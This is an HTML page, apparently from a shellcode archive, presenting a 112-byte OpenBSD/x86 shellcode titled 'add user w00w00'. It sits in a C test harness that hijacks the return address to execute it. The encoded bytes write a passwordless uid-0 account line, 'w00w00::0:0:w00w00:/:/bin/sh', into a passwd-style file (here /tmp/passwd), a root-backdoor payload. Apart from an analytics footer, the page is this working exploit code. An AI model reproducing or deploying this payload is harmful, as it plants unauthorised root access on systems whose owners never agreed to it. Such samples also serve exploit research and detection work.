<html><head><title>OpenBSD/x86 - add user w00w00 - 112 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#include &lt;string.h&gt;

char shell[]=
&quot;\xeb\x2b\x5e\x31\xc0\x88\x46\x0b&quot;
&quot;\x88\x46\x29\x50\xb0\x09\x50\x31&quot;
&quot;\xc0\x56\x50\xb0\x05\xcd\x80\x89&quot;
&quot;\xc3\x6a\x1d\x8d\x46\x0c\x50\x53&quot;
&quot;\x50\x31\xc0\xb0\x04\xcd\x80\x31&quot;
&quot;\xc0\xb0\x01\xcd\x80\xe8\xd0\xff&quot;
&quot;\xff\xff\x2f\x74\x6d\x70\x2f\x70&quot;
&quot;\x61\x73\x73\x77\x64\x30\x77\x30&quot;
&quot;\x30\x77\x30\x30\x3a\x3a\x30\x3a&quot;
&quot;\x30\x3a\x77\x30\x30\x77\x30\x30&quot;
&quot;\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f&quot;
&quot;\x73\x68\x0a\x30\xff\xff\xff\xff&quot;
&quot;\xff\xff\xff\xff\xff\xff\xff\xff&quot;
&quot;\xff\xff\xff\xff\xff\xff\xff\xff&quot;;

main()
{
   int *ret;
   printf(&quot;\n%d\n&quot;,sizeof(shell));
   ret=(int*)&amp;ret+2;
   (*ret)=(int)shell;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
